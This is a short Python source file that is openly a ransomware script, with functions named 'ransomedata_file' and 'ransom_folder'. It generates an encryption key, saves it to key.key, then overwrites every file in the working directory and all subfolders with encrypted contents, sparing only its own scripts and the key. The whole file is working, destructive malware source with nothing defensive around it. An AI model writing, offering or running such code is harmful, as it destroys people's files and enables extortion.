import os
from cryptography.fernet import Fernet

def ransomedata_file(file_path, key):
    with open(file_path, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file_path, "wb") as thefile:
        thefile.write(contents_encrypted)

def ransom_folder(directory_path, key):
    for foldername, subfolders, filenames in os.walk(directory_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            if filename not in ["encrpt.py", "decrypt.py", "key.key"]:
                ransomedata_file(file_path, key)

files = []

for file in os.listdir():
    if file == "encrpt.py" or file == "decrypt.py" or file == "key.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    ransomedata_file(file, key)

# Encrypt files in child folders
current_directory = os.getcwd()
ransom_folder(current_directory, key)
